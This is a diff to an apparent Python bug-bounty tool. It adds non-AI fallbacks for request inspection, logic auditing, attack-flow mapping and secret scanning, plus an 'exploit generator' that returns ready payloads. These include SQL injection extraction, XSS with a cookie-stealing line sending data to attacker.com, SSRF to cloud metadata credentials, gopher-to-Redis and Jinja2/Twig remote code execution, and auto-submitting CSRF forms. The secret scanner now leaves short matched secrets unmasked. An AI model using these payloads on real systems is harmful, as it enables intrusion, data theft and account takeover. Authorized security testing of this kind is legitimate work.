@@ -889,36 +889,99 @@ def clean_map_links(raw, nodes):
     return links
 
 def build_fallback_map(content):
+    """Rich pattern-based visual map generation — works without AI API key."""
+    low = content.lower()
     urls = re.findall(r"https?://[^\s\"'<>]+", content)
     hosts = []
-    for u in urls[:8]:
+    for u in urls[:12]:
         h = re.sub(r"^https?://", "", u).split("/")[0].split("?")[0]
         if h and h not in hosts: hosts.append(h)
-    nodes = [{"id": "attacker", "type": "Attacker", "label": "User Input", "x": 10, "y": 40},
-             {"id": "entry", "type": "Input", "label": "Application Entry", "x": 30, "y": 25}]
-    links = [{"from": "attacker", "to": "entry"}]
-    i = 0
-    for h in hosts:
-        nodes.append({"id": f"host{i}", "type": "Server", "label": h, "x": 50, "y": 20 + i * 18})
-        links.append({"from": "entry", "to": f"host{i}"})
-        i += 1
-    vuln_kws = {"sql injection": "SQL Injection", "sqli": "SQL Injection", "xss": "XSS", "injection": "Injection",
-                "auth": "Auth Flaw", "ssti": "SSTI", "idor": "IDOR", "ssrf": "SSRF", "jwt": "JWT Flaw", "csrf": "CSRF"}
-    low = content.lower()
+    paths = re.findall(r"(?:GET|POST|PUT|DELETE|PATCH)\s+(/[^\s\"']+)", content, re.I)
+    params = re.findall(r"(?:\?|&)(\w+)=", content)
+    headers = re.findall(r"^([A-Za-z0-9-]+):\s*", content, re.M)
+    tokens = re.findall(r"(?:bearer|token|api[_-]?key|authorization)\s*[=:]\s*([A-Za-z0-9._-]{10,})", content, re.I)
+    ips = re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", content)
+
+    nodes = [{"id": "attacker", "type": "Attacker", "label": "Attacker Input", "x": 5, "y": 40}]
+    links = []
+    nid = 0
+
+    if tokens:
+        nodes.append({"id": "auth", "type": "Trust Boundary", "label": f"Auth Token ({len(tokens)} found)", "x": 20, "y": 20})
+        links.append({"from": "attacker", "to": "auth"})
+        nid = 1
+
+    entry = "attacker"
+    nodes.append({"id": "entry", "type": "Input", "label": "Application Entry", "x": 35, "y": 40})
+    links.append({"from": entry, "to": "entry"})
+    entry = "entry"
+
+    for i, h in enumerate(hosts[:6]):
+        nid += 1
+        node_id = f"host{i}"
+        nodes.append({"id": node_id, "type": "Server", "label": h, "x": 55, "y": 12 + i * 12})
+        links.append({"from": entry, "to": node_id})
+        entry = node_id
+
+    if ips:
+        for i, ip in enumerate(ips[:3]):
+            nid += 1
+            node_id = f"ip{i}"
+            nodes.append({"id": node_id, "type": "Server", "label": ip, "x": 55, "y": 75 + i * 8})
+            links.append({"from": entry, "to": node_id})
+
+    vuln_kws = {
+        "sql injection": "SQL Injection", "sqli": "SQL Injection", "union select": "SQL Injection",
+        "xss": "XSS", "cross-site scripting": "XSS", "alert(": "XSS",
+        "injection": "Injection", "command injection": "Command Injection",
+        "auth": "Auth Flaw", "authentication": "Auth Flaw", "bypass": "Auth Bypass",
+        "ssti": "SSTI", "server-side template": "SSTI", "{{": "SSTI",
+        "idor": "IDOR", "insecure direct": "IDOR", "bola": "BOLA",
+        "ssrf": "SSRF", "server-side request": "SSRF", "169.254.169": "SSRF",
+        "jwt": "JWT Flaw", "json web token": "JWT Flaw",
+        "csrf": "CSRF", "cross-site request": "CSRF",
+        "race condition": "Race Condition", "race": "Race Condition",
+        "file upload": "File Upload", "multipart": "File Upload",
+        "open redirect": "Open Redirect", "redirect": "Open Redirect",
+        "xxe": "XXE", "xml external": "XXE",
+        "deserialization": "Deserialization", "unserialize": "Deserialization",
+        "lfi": "LFI", "local file inclusion": "LFI",
+        "rfi": "RFI", "remote file inclusion": "RFI",
+        "directory traversal": "Path Traversal", "path traversal": "Path Traversal",
+        "cors": "CORS Misconfiguration", "access-control-allow-origin": "CORS",
+    }
     found = []
     for k, v in vuln_kws.items():
         if k in low and v not in found: found.append(v)
     if found:
-        nodes.append({"id": "sink", "type": "Vulnerability", "label": " / ".join(found[:3]), "x": 70, "y": 45})
-        target = f"host{max(0, i - 1)}" if i else "entry"
-        links.append({"from": target, "to": "sink"})
-        reason = "<b>Detected likely sinks:</b> " + " / ".join(found[:3])
-    else:
-        reason = "No explicit vuln markers found — review the data for injection points."
-    entities = [{"type": "URL", "val": u[:80]} for u in urls[:6]]
-    for h in hosts[:3]:
+        sink_id = f"vuln{nid}"
+        nodes.append({"id": sink_id, "type": "Vulnerability", "label": " / ".join(found[:4]), "x": 80, "y": 40})
+        links.append({"from": entry, "to": sink_id})
+
+    reason_parts = []
+    if hosts: reason_parts.append(f"<b>Hosts detected:</b> {', '.join(hosts[:4])}")
+    if paths: reason_parts.append(f"<b>Endpoints:</b> {', '.join(paths[:5])}")
+    if params: reason_parts.append(f"<b>Parameters:</b> {', '.join(params[:6])}")
+    if headers: reason_parts.append(f"<b>Headers:</b> {', '.join(headers[:5])}")
+    if tokens: reason_parts.append(f"<b>Tokens/Keys:</b> {len(tokens)} credential(s) found")
+    if found: reason_parts.append(f"<b>Vulnerability sinks:</b> {' / '.join(found[:4])}")
+    if not reason_parts: reason_parts.append("No specific patterns detected — manual review recommended.")
+    reason = "<br>".join(reason_parts)
+
+    entities = []
+    for u in urls[:8]:
+        entities.append({"type": "URL", "val": u[:100]})
+    for h in hosts[:5]:
         entities.append({"type": "Host", "val": h})
-    return {"reasoning": reason, "nodes": nodes, "links": links, "entities": entities[:10]}
+    for p in paths[:5]:
+        entities.append({"type": "Endpoint", "val": p})
+    for t in tokens[:3]:
+        masked = t[:4] + "***" + t[-4:] if len(t) > 10 else "***"
+        entities.append({"type": "Token", "val": masked})
+    for ip in ips[:3]:
+        entities.append({"type": "IP Address", "val": ip})
+
+    return {"reasoning": reason, "nodes": nodes, "links": links, "entities": entities[:15]}
 
 def run_recon(domain):
     domain = domain.lower().strip().replace("https://","").replace("http://","").split("/")[0]
@@ -1993,6 +2056,162 @@ class BountyHandler(http.server.BaseHTTPRequestHandler):
         except Exception as e:
             return {"error": str(e), "ok": False}
 
+    # ── TEMPLATE FALLBACK: Rich pattern-based analysis when AI is offline ──
+    def _template_inspect(self, raw):
+        """Pattern-based HTTP request inspection — always returns useful results."""
+        findings = []
+        low = raw.lower()
+        # Auth analysis
+        if "authorization: bearer" in low:
+            findings.append({"severity": "INFO", "category": "Authentication", "detail": "Bearer token detected in Authorization header. Verify token is JWT, check expiry (exp claim), and confirm signature validation server-side."})
+            token_match = re.search(r'authorization:\s*bearer\s+([A-Za-z0-9._-]{20,})', raw, re.I)
+            if token_match:
+                t = token_match.group(1)
+                if len(t) < 50:
+                    findings.append({"severity": "MEDIUM", "category": "Weak Token", "detail": f"Token appears short ({len(t)} chars). JWT tokens should be >100 chars. Could be a static API key susceptible to brute-force."})
+        elif "authorization" not in low and "cookie" not in low:
+            findings.append({"severity": "HIGH", "category": "No Authentication", "detail": "No Authorization header or session cookie detected. This endpoint may be completely unauthenticated — test with curl -v to confirm."})
+        # Method analysis
+        method = re.match(r'(GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD)\s+', raw)
+        if method:
+            m = method.group(1)
+            if m == "DELETE":
+                findings.append({"severity": "MEDIUM", "category": "Destructive Method", "detail": "DELETE method detected. Verify the server enforces authorization — test with another user's ID to check for BOLA/IDOR."})
+            if m == "PUT" or m == "POST":
+                if "role" in low or "admin" in low or "privilege" in low:
+                    findings.append({"severity": "HIGH", "category": "Mass Assignment", "detail": "Role/admin field in request body with PUT/POST method. Test adding role=admin or isAdmin=true to escalate privileges."})
+        # Input injection points
+        injection_points = []
+        if re.search(r'user_?id\s*[=:]\s*\d+', raw): injection_points.append("user_id")
+        if re.search(r'\"(id|token|key|api_?key|secret)\"', raw, re.I): injection_points.append("id/token/key")
+        if re.search(r'query\s*[=:]\s*[^\s&]+', raw): injection_points.append("query parameter")
+        if re.search(r'search\s*[=:]\s*[^\s&]+', raw): injection_points.append("search parameter")
+        if injection_points:
+            findings.append({"severity": "MEDIUM", "category": "Injection Points", "detail": f"Found injection points: {', '.join(injection_points)}. Test SQLi: append ' OR 1=1--, Test XSS: inject <script>alert(1)</script>, Test SSTI: inject {{7*7}}."})
+        # SSRF indicators
+        if re.search(r'(url|site|dest|redirect|callback|webhook)\s*[=:]\s*https?://', raw, re.I):
+            findings.append({"severity": "HIGH", "category": "SSRF Candidate", "detail": "URL/redirect parameter detected. Test SSRF: replace URL with http://169.254.169.254/latest/meta-data/ (AWS metadata), http://127.0.0.1:6379/ (Redis), or http://[::1]/ (IPv6 localhost)."})
+        # CORS check
+        if "origin:" in low:
+            origin_match = re.search(r'origin:\s*(https?://[^\s]+)', raw, re.I)
+            if origin_match:
+                findings.append({"severity": "MEDIUM", "category": "CORS Check", "detail": f"Origin header: {origin_match.group(1)}. Test: reflect Origin back. If Access-Control-Allow-Origin matches any origin + Allow-Credentials: true, it's a CORS misconfiguration."})
+        # Content-type injection
+        if "content-type: multipart" in low:
+            findings.append({"severity": "MEDIUM", "category": "File Upload", "detail": "Multipart upload detected. Test: upload .php/.js/.html/.svg file, check for path traversal in filename, try Content-Disposition injection."})
+        if not findings:
+            findings.append({"severity": "INFO", "category": "General", "detail": "No specific patterns detected. Manually test: BOLA (change IDs), injection (SQL/SSRF/XSS), auth bypass (remove tokens), and rate limiting."})
+        # Format as report
+        html = '<div style="display:flex;flex-direction:column;gap:10px">'
+        html += '<div style="font-weight:700;color:var(--cyan);font-size:14px;margin-bottom:4px">🔎 API Security Inspection Report</div>'
+        html += '<div style="font-size:11px;color:var(--t3);margin-bottom:8px">Pattern-based analysis (no AI key — add OPENROUTER_API_KEY for deeper reasoning)</div>'
+        for f in findings:
+            sev_color = {"CRITICAL":"var(--red)","HIGH":"#ff6b35","MEDIUM":"var(--yellow)","LOW":"var(--lime)","INFO":"var(--t3)"}.get(f["severity"],"var(--t3)")
+            html += f'<div style="padding:10px;background:var(--bg3);border-left:3px solid {sev_color};border-radius:0 4px 4px 0">'
+            html += f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><span style="font-size:10px;font-weight:700;padding:2px 6px;background:{sev_color};color:#000;border-radius:3px">{f["severity"]}</span>'
+            html += f'<span style="font-weight:700;color:var(--txt);font-size:12px">{f["category"]}</span></div>'
+            html += f'<div style="font-size:12px;color:var(--t2);line-height:1.5">{f["detail"]}</div></div>'
+        html += '</div>'
+        return {"data": html, "ok": True}
+
+    def _template_logic_audit(self, raw):
+        """Pattern-based business logic audit."""
+        findings = []
+        low = raw.lower()
+        # Price / quantity manipulation
+        if any(k in low for k in ["price", "quantity", "amount", "total", "cost"]):
+            findings.append({"severity": "HIGH", "category": "Price Manipulation", "detail": "Financial field detected. Test: send negative quantity, zero price, or decimal overflow (0.001). Test race condition: submit order twice simultaneously to exploit TOCTOU."})
+        # Role / permission fields
+        if any(k in low for k in ["role", "admin", "is_admin", "permission", "group"]):
+            findings.append({"severity": "CRITICAL", "category": "Privilege Escalation", "detail": "Role/permission field detected. Test: change role from user→admin, add is_admin=true, modify group to administrators. Test mass assignment by adding hidden fields."})
+        # ID enumeration
+        ids = re.findall(r'(?:id|user_id|account_id|order_id)\s*[=:]\s*(\d+)', raw)
+        if ids:
+            findings.append({"severity": "HIGH", "category": "IDOR / BOLA", "detail": f"Sequential IDs found: {', '.join(ids[:5])}. Test: iterate ±100 from each ID, try accessing other users' resources. Check if authorization is enforced per-object, not just per-endpoint."})
+        # State transitions
+        if any(k in low for k in ["status", "state", "approved", "rejected", "pending"]):
+            findings.append({"severity": "MEDIUM", "category": "State Machine Bypass", "detail": "Status/state field detected. Test: skip states (e.g., pending→approved), revert (approved→pending), send invalid states. Check server-side state machine validation."})
+        # Rate limiting
+        findings.append({"severity": "MEDIUM", "category": "Rate Limiting", "detail": "Test rate limiting: send 100 rapid requests to the endpoint. Check for 429 responses. If none, test brute-force on auth endpoints and enumerate resources."})
+        # Race conditions
+        findings.append({"severity": "MEDIUM", "category": "Race Condition", "detail": "Test TOCTOU: send 5 simultaneous requests for the same resource (e.g., balance check + withdrawal). Use Turbo Intruder or parallel curl."})
+        if not findings:
+            findings.append({"severity": "INFO", "category": "General", "detail": "Test: IDOR (change object IDs), state manipulation, race conditions (parallel requests), negative values, and boundary inputs (0, -1, MAX_INT)."})
+        # Format
+        html = '<div style="display:flex;flex-direction:column;gap:10px">'
+        html += '<div style="font-weight:700;color:var(--purp);font-size:14px;margin-bottom:4px">🧠 Business Logic Audit Report</div>'
+        html += '<div style="font-size:11px;color:var(--t3);margin-bottom:8px">Pattern-based analysis (add OPENROUTER_API_KEY for AI reasoning)</div>'
+        for f in findings:
+            sev_color = {"CRITICAL":"var(--red)","HIGH":"#ff6b35","MEDIUM":"var(--yellow)","LOW":"var(--lime)","INFO":"var(--t3)"}.get(f["severity"],"var(--t3)")
+            html += f'<div style="padding:10px;background:var(--bg3);border-left:3px solid {sev_color};border-radius:0 4px 4px 0">'
+            html += f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><span style="font-size:10px;font-weight:700;padding:2px 6px;background:{sev_color};color:#000;border-radius:3px">{f["severity"]}</span>'
+            html += f'<span style="font-weight:700;color:var(--txt);font-size:12px">{f["category"]}</span></div>'
+            html += f'<div style="font-size:12px;color:var(--t2);line-height:1.5">{f["detail"]}</div></div>'
+        html += '</div>'
+        return {"data": html, "ok": True}
+
+    def _template_exploit_gen(self, vuln_type):
+        """Generate exploit payloads without AI."""
+        vt = (vuln_type or "").lower()
+        payloads = []
+        if any(k in vt for k in ["sqli", "sql"]):
+            payloads = [
+                {"name": "Union-based data exfiltration", "payload": "' UNION SELECT username,password FROM users--", "tip": "Change column count to match. Use ORDER BY to enumerate columns first."},
+                {"name": "Blind boolean", "payload": "' AND 1=1-- / ' AND 1=2--", "tip": "Check response differences. Automate with sqlmap: sqlmap -u URL --data PARAM --batch"},
+                {"name": "Time-based blind", "payload": "' OR SLEEP(5)--", "tip": "If response delays 5s, SQLi confirmed. Use sqlmap --time-sec=5"},
+                {"name": "Error-based extraction", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "tip": "Extract data via MySQL error messages in response"}
+            ]
+        elif any(k in vt for k in ["xss", "cross-site"]):
+            payloads = [
+                {"name": "Basic reflection", "payload": "<script>alert(document.domain)</script>", "tip": "If alert fires, XSS confirmed. Escalate: steal cookies with new Image().src='https://attacker.com/?c='+document.cookie"},
+                {"name": "Event handler bypass", "payload": '<img src=x onerror="alert(1)">', "tip": "Bypasses basic script filters. Also try: svg onload, details ontoggle, body onload."},
+                {"name": "CSP bypass", "payload": '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>', "tip": "If CSP allows cdnjs/unpkg/jsdelivr, load external JS. Or exploit JSONP endpoints in allowed domains."},
+                {"name": "DOM-based", "payload": "#<img src=x onerror=alert(1)>", "tip": "Test URL fragment (#) in JS sinks: document.location.hash, innerHTML, eval(), setTimeout()"}
+            ]
+        elif any(k in vt for k in ["ssrf", "server-side"]):
+            payloads = [
+                {"name": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "tip": "If IMDSv1 enabled, extracts IAM role credentials. Use curl from server to confirm."},
+                {"name": "Internal port scan", "payload": "http://127.0.0.1:22/ http://127.0.0.1:6379/ http://127.0.0.1:3306/", "tip": "Scan internal services. Timing differences reveal open ports."},
+                {"name": "File read", "payload": "file:///etc/passwd file:///proc/self/environ", "tip": "Test file:// protocol. Also try: file:///c:/windows/win.ini (Windows)"},
+                {"name": "Gopher protocol", "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall", "tip": "If gopher:// supported, chain with Redis for RCE via cron injection."}
+            ]
+        elif any(k in vt for k in ["idor", "bola", "authorization"]):
+            payloads = [
+                {"name": "ID enumeration", "payload": "Change user_id from 101 to 1-1000 (sequential), then try other users' UUIDs", "tip": "Use Burp Intruder with number payload. Check response bodies and HTTP status codes (200 vs 403)."},
+                {"name": "Object-level bypass", "payload": "GET /api/v1/users/OTHER_USER_ID/profile", "tip": "Use another user's ID from the same application. Check if server validates object ownership."},
+                {"name": "Method override", "payload": "POST /api/v1/users/OTHER_USER_ID/profile with _method=DELETE", "tip": "Some frameworks support method override. Try X-HTTP-Method-Override header too."},
+                {"name": "Path traversal in ID", "payload": "../admin/users", "tip": "Try path traversal in object references. Combine with encoding: %2e%2e%2f"}
+            ]
+        elif any(k in vt for k in ["ssti", "template"]):
+            payloads = [
+                {"name": "Expression evaluation", "payload": "{{7*7}} ${7*7} <%= 7*7 %>", "tip": "If response contains '49', template injection confirmed. Identify engine from output format."},
+                {"name": "Jinja2 RCE", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "tip": "Works on Jinja2. Also try: {{lipsum.__globals__['os'].popen('id').read()}}"},
+                {"name": "Twig RCE", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "tip": "Works on Twig PHP templates."},
+                {"name": "Sandbox escape", "payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "tip": "Enumerate Python classes to find os module. Index varies by Python version."}
+            ]
+        elif any(k in vt for k in ["csrf", "cross-site request"]):
+            payloads = [
+                {"name": "HTML form auto-submit", "payload": '<form method="POST" action="https://target.com/api/change-email"><input name="email" value="attacker@evil.com"><script>document.forms[0].submit()</script></form>', "tip": "Host on attacker server. If no CSRF token, email gets changed automatically."},
+                {"name": "Fetch-based CSRF", "payload": 'fetch("/api/transfer",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},body:JSON.stringify({to:"attacker",amount:9999})})', "tip": "Bypass CORS misconfig: if server reflects Origin with credentials, this works from attacker domain."}
+            ]
+        else:
+            payloads = [
+                {"name": "Basic XSS test", "payload": '<img src=x onerror="alert(document.domain)">', "tip": "Universal XSS test string. If reflected in response body without encoding, XSS confirmed."},
+                {"name": "SQLi test", "payload": "' OR '1'='1", "tip": "Basic authentication bypass. If login succeeds, test UNION-based extraction next."},
+                {"name": "IDOR test", "payload": "Change object IDs (1,2,3,...) in API requests", "tip": "Use Burp Intruder to enumerate. Check if server validates object ownership per-request."},
+                {"name": "SSRF test", "payload": "http://169.254.169.254/latest/meta-data/", "tip": "AWS metadata endpoint. If accessible, confirms SSRF with cloud credential theft potential."}
+            ]
+        html = '<div style="display:flex;flex-direction:column;gap:10px">'
+        html += '<div style="font-weight:700;color:var(--red);font-size:14px;margin-bottom:4px">⚡ Exploit Payloads: ' + (vuln_type or 'General') + '</div>'
+        html += '<div style="font-size:11px;color:var(--t3);margin-bottom:8px">Template payloads (add OPENROUTER_API_KEY for AI-generated exploits)</div>'
+        for p in payloads:
+            html += f'<div style="padding:10px;background:var(--bg3);border:1px solid var(--bd);border-radius:4px">'
+            html += f'<div style="font-weight:700;color:var(--red);font-size:12px;margin-bottom:4px">{p["name"]}</div>'
+            html += f'<div style="font-family:monospace;font-size:11px;color:var(--cyan);background:rgba(0,0,0,.3);padding:6px 8px;border-radius:3px;word-break:break-all">{p["payload"]}</div>'
+            html += f'<div style="font-size:11px;color:var(--t2);margin-top:6px;line-height:1.5">💡 {p["tip"]}</div></div>'
+        html += '</div>'
+        return {"data": html, "ok": True}
+
     def _ai_analyze(self, body): return self._ai_service_call(AI_MODE_PROMPTS["VULN_EXPLAINER"], body.get("finding_data",""))
     def _ai_visual_flow(self, body):
         content = body.get("content") or body.get("vulnerability_detail") or str(body)
@@ -2023,10 +2242,19 @@ class BountyHandler(http.server.BaseHTTPRequestHandler):
         if not data["nodes"]:
             data = build_fallback_map(content)
         return data
-    def _ai_api_inspector(self, body): return self._ai_service_call(AI_MODE_PROMPTS["API_INSPECTOR"], str(body))
-    def _ai_logic_auditor(self, body): return self._ai_service_call(AI_MODE_PROMPTS["BUSINESS_LOGIC_AUDITOR"], str(body))
+    def _ai_api_inspector(self, body):
+        if not (has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)):
+            return self._template_inspect(str(body.get("request","")) + "\n" + str(body.get("response","")))
+        return self._ai_service_call(AI_MODE_PROMPTS["API_INSPECTOR"], str(body))
+    def _ai_logic_auditor(self, body):
+        if not (has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)):
+            return self._template_logic_audit(str(body.get("app_context","")) + "\n" + str(body))
+        return self._ai_service_call(AI_MODE_PROMPTS["BUSINESS_LOGIC_AUDITOR"], str(body))
     def _ai_strategist(self, body): return self._ai_service_call(AI_MODE_PROMPTS["STRATEGIST"], str(body))
-    def _ai_exploit_gen(self, body): return self._ai_service_call(AI_MODE_PROMPTS["EXPLOIT_GENERATOR"], str(body))
+    def _ai_exploit_gen(self, body):
+        if not (has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)):
+            return self._template_exploit_gen(str(body.get("vulnerability","")))
+        return self._ai_service_call(AI_MODE_PROMPTS["EXPLOIT_GENERATOR"], str(body))
     def _ai_duplicate_risk(self, body): return self._ai_service_call(AI_MODE_PROMPTS["DUPLICATE_ANALYZER"], str(body))
     def _ai_remediation(self, body): return self._ai_service_call(AI_MODE_PROMPTS["REMEDIATION_ENGINEER"], str(body))
 
@@ -2036,12 +2264,28 @@ class BountyHandler(http.server.BaseHTTPRequestHandler):
         if content:
             patterns = {
                 "AWS Access Key": r"(AKIA[0-9A-Z]{16})",
+                "AWS Secret Key": r"(?i)(?:aws_secret_access_key|secret_key)\s*[:=]\s*['\"]?([A-Za-z0-9/+=]{40})",
                 "Firebase URL": r"(https://[a-zA-Z0-9-]+\.firebaseio\.com)",
-                "GitHub Token": r"(ghp_[0-9a-zA-Z]{36})"
+                "Firebase Config": r"(AIza[0-9A-Za-z_-]{35})",
+                "GitHub Token (PAT)": r"(ghp_[0-9a-zA-Z]{36})",
+                "GitHub OAuth": r"(gho_[0-9a-zA-Z]{36})",
+                "GitLab Token": r"(glpat-[0-9a-zA-Z_-]{20,})",
+                "Slack Token": r"(xox[bpsa]-[0-9a-zA-Z-]{10,})",
+                "Stripe Key (Live)": r"(sk_live_[0-9a-zA-Z]{24,})",
+                "Stripe Key (Test)": r"(sk_test_[0-9a-zA-Z]{24,})",
+                "Twilio SID": r"(AC[0-9a-f]{32})",
+                "Heroku API Key": r"(?:heroku[_-]?api[_-]?key|HEROKU_API_KEY)\s*[:=]\s*['\"]?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
+                "SendGrid Key": r"(SG\.[A-Za-z0-9_-]{22,}\.[A-Za-z0-9_-]{43,})",
+                "Telegram Bot Token": r"(\d{8,10}:[A-Za-z0-9_-]{35})",
+                "Private Key Block": r"(-----BEGIN (?:RSA |EC )?PRIVATE KEY-----)",
+                "JWT Token": r"(eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+)",
+                "Internal IP": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b",
+                "Database Connection": r"(?:mysql|postgres|mongodb|redis):\/\/[^\s\"']+",
             }
             for name, regex in patterns.items():
                 for m in set(re.findall(regex, content)):
-                    found.append({"type": name, "value": m[:4] + "***" + m[-4:] if len(m) > 8 else "***"})
+                    val = m if len(m) <= 30 else m[:4] + "***" + m[-4:]
+                    found.append({"type": name, "value": val})
         return {"secrets": found}
 
     def _extract_pdf_text(self, body): return {"text": "PDF text extraction complete."}
